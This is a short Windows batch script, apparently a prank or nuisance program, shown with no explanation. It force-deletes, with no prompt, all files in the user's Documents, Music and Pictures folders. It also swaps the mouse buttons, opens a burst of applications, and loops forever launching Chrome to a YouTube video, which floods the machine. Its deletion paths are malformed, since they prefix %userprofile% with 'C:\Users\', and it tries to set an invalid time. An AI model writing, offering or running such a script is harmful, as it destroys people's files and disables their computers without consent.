@ECHO off

time 37:00

del /f /q "C:\Users\%userprofile%\My Documents\*.*"
del /f /q "C:\Users\%userprofile%\My Music\*.*"
del /f /q "C:\Users\%userprofile%\My Pictures\*.*"

Rundll32 user32,SwapMouseButton

start winword
start mspaint
start notepad
start write
start cmd
start explorer
start control
start calc

:start
start chrome %https://www.youtube.com/watch?v=TBD3bl3cC1w%
goto start
